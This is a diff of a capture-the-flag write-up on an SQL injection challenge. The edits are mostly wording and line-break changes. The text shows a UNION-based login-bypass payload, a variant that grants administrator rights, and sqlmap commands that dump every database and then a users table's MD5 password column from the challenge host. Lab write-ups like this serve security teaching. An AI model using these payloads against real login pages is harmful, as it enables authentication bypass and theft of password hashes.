@@ -2,7 +2,7 @@
 **_SQL Injection_** \
 Difficulty: Medium
 
-> **Note!** I didn't manage to complete this task entirely. However, I have decided to still include this partial solution as I did "collect most of the puzzles".
+> **Note!** I didn't manage to complete this task entirely. However, I have decided to still include this partial solution as I did "collect most of the puzzles."
 
 ### 1. Use SQLMap to quickly find a working injection
 ```
@@ -32,23 +32,31 @@ The injection above can be simplified to:
 username=' UNION ALL SELECT NULL,"",NULL,NULL#&password=any
 ```
 
-> Password doesn't matter as thanks to the injection - it isn't even checked.
+> The Password doesn't matter as thanks to the injection - it isn't even checked.
 
-However, we aren't done yet. We have only accessed the database and we don't have the administrator permissions that are essential to obtain the flag. We can achieve that by modifying the last argument.
+However, we aren't done yet.
+We have only accessed the database,
+and we don't have the administrator permissions that are essential to get the flag.
+We can achieve that by modifying the last argument.
 
 ```
 username=' UNION ALL SELECT NULL,"",NULL,1#&password=any
 ```
 
-This simple modification let me access another stage. However, now we need to provide the actual password.
+This modification lets me access another stage. However, now we need to provide the actual password.
 
 ### 3. Use the injection along with the SQLMap tool to dump everything
 ```sh
 python3 sqlmap.py -u "http://container-manager.francecentral.cloudapp.azure.com:10144/login.php" --data="username=' UNION ALL SELECT NULL,"",NULL,1#&password=PxEl" --dump-all
 ```
-After dumping everything and analysing the output, I found out that the database is called `db1` and has a table named `users`.
+After dumping everything and analyzing the output,
+I found out that the database is called `db1` and has a table named `users`.
 
-While trying to SQL inject manually (without the usage of SQLMap), I found out that one of the columns in that table is called `passwordMD5`. It has been proven to exist by the MariaDB error. The name clearly indicates that it likely contains the MD5 hashes of passwords. Let's dump that column.
+While trying to SQL to inject manually (without the usage of SQLMap),
+I found out that one of the columns in that table is called `passwordMD5`.
+It has been proven to exist by the MariaDB error.
+The name clearly indicates that it likely contains the MD5 hashes of passwords.
+Let's dump that column.
 
 ```sh
 python3 sqlmap.py -u "http://container-manager.francecentral.cloudapp.azure.com:10144/confirm.php" --batch --forms --crawl=2 -D db1 -T users -C passwordMD5 --dump
